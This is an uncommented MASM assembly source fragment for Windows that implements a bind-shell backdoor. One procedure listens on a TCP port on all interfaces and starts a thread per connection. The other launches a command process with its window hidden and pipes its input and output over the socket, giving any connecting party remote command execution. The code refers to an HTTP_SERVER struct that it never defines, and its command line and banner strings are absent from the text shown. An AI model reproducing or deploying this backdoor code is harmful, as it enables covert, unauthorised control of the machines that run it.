ShellClient proto :dword
Shelld proto :dword

SHELL_SERVER struct
  dwsocket                dword ?
  dwport                  dword ?
  bsync                   byte ?
SHELL_SERVER ends  

.code
ShellClient proc dwSock:dword
    local sat:SECURITY_ATTRIBUTES 
    local hiRead:dword
    local hoRead:dword
    local hiWrite:dword
    local hoWrite:dword
    local startupinfo:STARTUPINFO 
    local processinfo:PROCESS_INFORMATION 
    local exitcode:dword
    local buffer[1024]:byte 
    local bytes:dword 
    local available:dword
    local data:dword

mov sat.nLength, sizeof SECURITY_ATTRIBUTES 
mov sat.lpSecurityDescriptor, 0 
mov sat.bInheritHandle, TRUE 
invoke CreatePipe, addr hiRead, addr hiWrite, addr sat, 0 
invoke CreatePipe, addr hoRead, addr hoWrite, addr sat, 0 
invoke GetStartupInfo, addr startupinfo
mov startupinfo.cb, sizeof STARTUPINFO 
mov eax, hoWrite
mov startupinfo.hStdOutput, eax
mov startupinfo.hStdError, eax
mov eax, hiRead
mov startupinfo.hStdInput, eax
mov startupinfo.dwFlags, STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES 
mov startupinfo.wShowWindow, SW_HIDE 
invoke CreateProcess, 0, addr szCommandLine, 0, 0, TRUE, CREATE_NEW_CONSOLE, 0, 0, addr startupinfo, addr processinfo
invoke CloseHandle, hoWrite
invoke CloseHandle, hiRead
mov bytes, 1
invoke ioctlsocket, dwSock, FIONBIO, addr bytes
invoke send, dwSock, addr szBanner, sizeof szBanner, 0
.while TRUE
  invoke Sleep, 1
  invoke GetExitCodeProcess, processinfo.hProcess, addr exitcode
  .if exitcode != STILL_ACTIVE
    .break
  .endif
  invoke PeekNamedPipe, hoRead, addr buffer, 1024, addr bytes, addr available, 0
  .if bytes != 0
    .if available > 1024
      .while bytes >= 1024
        invoke Sleep, 1
        invoke ReadFile, hoRead, addr buffer, 1024, addr bytes, 0
        .if bytes != 0
          invoke send, dwSock, addr buffer, bytes, 0
        .endif
      .endw  
    .else
      invoke ReadFile, hoRead, addr buffer, 1024, addr bytes, 0
      .if bytes != 0
        invoke send, dwSock, addr buffer, bytes, 0
      .endif
    .endif    
  .endif  
@@:
  invoke recv, dwSock, addr buffer, 1024, 0
  .if eax == SOCKET_ERROR || eax == 0
    invoke WSAGetLastError
    .if eax == WSAEWOULDBLOCK
      .continue
    .else
      invoke TerminateProcess, processinfo.hProcess, 0
      .break
    .endif  
  .else
    mov edx, eax
    invoke WriteFile, hiWrite, addr buffer, edx, addr bytes, 0
  .endif
.endw
invoke CloseHandle, hiWrite 
invoke CloseHandle, hoRead 
invoke closesocket, dwSock
ret 
ShellClient endp 

Shelld proc lpParam:dword
local shelld:SHELL_SERVER
local SockAddrIn:sockaddr_in
local dwSock:dword
local dwMode:dword
invoke CopyMemory, addr shelld, lpParam, sizeof shelld
invoke socket, PF_INET, SOCK_STREAM, 0
mov dwSock, eax
mov eax, lpParam
assume eax:ptr HTTP_SERVER
mov ecx, dwSock
mov [eax].dwsocket, ecx
mov [eax].bsync, 1
assume eax:nothing
mov SockAddrIn.sin_family, AF_INET
invoke htons, shelld.dwport
mov SockAddrIn.sin_port, ax
mov SockAddrIn.sin_addr, INADDR_ANY
invoke bind, dwSock, addr SockAddrIn, sizeof SockAddrIn
mov dwMode, 1
invoke ioctlsocket, dwSock, FIONBIO, addr dwMode
invoke listen, dwSock, SOMAXCONN
@@:
invoke accept, dwSock, addr SockAddrIn, 0
.if eax != INVALID_SOCKET
  mov edx, eax
  invoke CreateThread, 0, 0, addr ShellClient, edx, 0, 0
  invoke CloseHandle, eax
.endif
invoke Sleep, 1000
jmp @B
ret
Shelld endp

